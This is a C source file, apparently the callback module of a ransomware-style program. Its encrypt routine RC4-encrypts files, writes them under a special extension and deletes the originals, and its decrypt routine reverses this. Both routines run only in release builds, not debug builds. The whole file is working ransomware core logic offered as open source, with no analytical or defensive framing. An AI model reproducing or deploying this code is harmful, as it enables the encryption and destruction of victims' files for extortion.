/*
MIT License

Copyright (c) 2024 kadzicu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "CallBack.h"
#include "RC4.h"

LPBYTE key;
INT key_len;

VOID encrypt(_TCHAR* file)
{
#ifndef _DEBUG
	_TCHAR* file_ext = NULL;
	if (!(file_ext = PathFindExtension(file))) 
		ExitProcess(0);

	if (lstrcmp(_ARTIFACT, file_ext))
	{
		FILE* stream;
		if (_tfopen_s(&stream, file, _T("rb")))
			ExitProcess(0);
		
		fseek(stream, 0, SEEK_END);
		long size = ftell(stream);
		fseek(stream, 0, SEEK_SET);

		LPBYTE buffer = NULL;
		if (!(buffer = (LPBYTE)calloc(size, sizeof(BYTE))))
			ExitProcess(0);

		fread(buffer, sizeof(BYTE), size, stream);
		fclose(stream);

		rc4_enc(buffer, size, key, key_len);

		_TCHAR name[MAX_PATH_V2] = { 0 };
		if (_tcscpy_s(name, MAX_PATH_V2, file))
			ExitProcess(0);
		if (_tcscat_s(name, MAX_PATH_V2, _ARTIFACT))
			ExitProcess(0);

		if (_tfopen_s(&stream, name, _T("wb")))
			ExitProcess(0);

		fwrite(buffer, sizeof(BYTE), size, stream);

		fclose(stream);
		free(buffer);

		_tremove(file);
	}
#endif 
}

VOID decrypt(_TCHAR* file)
{
#ifndef _DEBUG
	_TCHAR* file_ext = NULL;
	if (!(file_ext = PathFindExtension(file)))
		ExitProcess(0);

	if (!lstrcmp(_ARTIFACT, file_ext))
	{
		FILE* stream;
		if (_tfopen_s(&stream, file, _T("rb")))
			ExitProcess(0);

		fseek(stream, 0, SEEK_END);
		long size = ftell(stream);
		fseek(stream, 0, SEEK_SET);

		LPBYTE buffer = NULL;
		if (!(buffer = (LPBYTE)calloc(size, sizeof(BYTE))))
			ExitProcess(0);

		fread(buffer, sizeof(BYTE), size, stream);
		fclose(stream);

		rc4_dec(buffer, size, key, key_len);

		_TCHAR name[MAX_PATH_V2] = { 0 };
		if (_tcscpy_s(name, MAX_PATH_V2, file))
			ExitProcess(0);

		name[_tcslen(name) - 9] = '\0';

		if (_tfopen_s(&stream, name, _T("wb")))
			ExitProcess(0);

		fwrite(buffer, sizeof(BYTE), size, stream);

		fclose(stream);
		free(buffer);

		_tremove(file);
	}
#endif 
}